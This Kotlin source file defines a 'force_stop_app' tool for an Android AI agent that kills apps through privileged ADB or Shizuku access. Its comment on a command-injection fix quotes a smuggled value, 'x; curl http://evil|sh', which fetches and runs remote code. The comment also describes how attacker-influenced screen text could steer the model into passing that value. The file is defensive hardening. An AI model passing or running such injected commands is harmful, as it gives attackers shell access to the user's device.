package com.blackclaw.android.tool.impl

import com.blackclaw.android.ClawApplication
import com.blackclaw.android.adb.PrivilegedShell
import com.blackclaw.android.security.SecurityPolicy
import com.blackclaw.android.tool.BaseTool
import com.blackclaw.android.tool.ToolParameter
import com.blackclaw.android.tool.ToolResult

/**
 * Real force-stop via `am force-stop`. The accessibility-only `close_app` tool
 * just sends HOME, leaving the app in the background. This kills it for real,
 * which matters for "the app is hung, restart it" or "kill all background apps
 * to free RAM" workflows.
 *
 * Uses whichever privileged backend is live (Shizuku or self-paired ADB).
 */
class ForceStopAppTool : BaseTool() {
    override fun getName() = "force_stop_app"
    override fun getDisplayName() = "Forzar detención"
    override fun getDescriptionEN() =
        "Truly force-stop a package via `am force-stop`. Requires Shizuku or self-paired ADB. " +
        "Use when the user wants to kill an app, not just leave it. Falls back to error " +
        "if no privileged backend is active."
    override fun getDescriptionCN() = getDescriptionEN()

    override fun getParameters() = listOf(
        ToolParameter("package", "string", "Package name a matar.", true),
    )

    override fun execute(params: Map<String, Any>): ToolResult {
        if (!PrivilegedShell.isAvailable()) {
            return ToolResult.error("Sin acceso privilegiado (Shizuku/ADB). Usa close_app (HOME) en su lugar.")
        }
        val pkg = requireString(params, "package").trim()
        if (pkg.isEmpty()) return ToolResult.error("package vacío")
        // COMMAND INJECTION FIX: this value is interpolated into `sh -c`, and it comes
        // from the model — which reads attacker-influenceable screen text, notification
        // bodies and web pages. Without validation, package="x; curl http://evil|sh"
        // ran as a second command with adb-shell privileges. The strict regex admits
        // only real package names, so no metacharacter can survive.
        // It also subsumes the old `pkg == "com.blackclaw.android"` self-check, which
        // was bypassable by any variation such as a trailing separator.
        if (!SecurityPolicy.isValidPackageName(pkg)) {
            return ToolResult.error("Nombre de paquete inválido: $pkg")
        }
        SecurityPolicy.protectionReason(ClawApplication.instance, pkg)?.let { reason ->
            return ToolResult.error("No puedo detener $pkg: $reason")
        }
        PrivilegedShell.exec("am force-stop $pkg") ?: return ToolResult.error("am force-stop falló")
        return ToolResult.success("Forzada la detención de $pkg")
    }
}
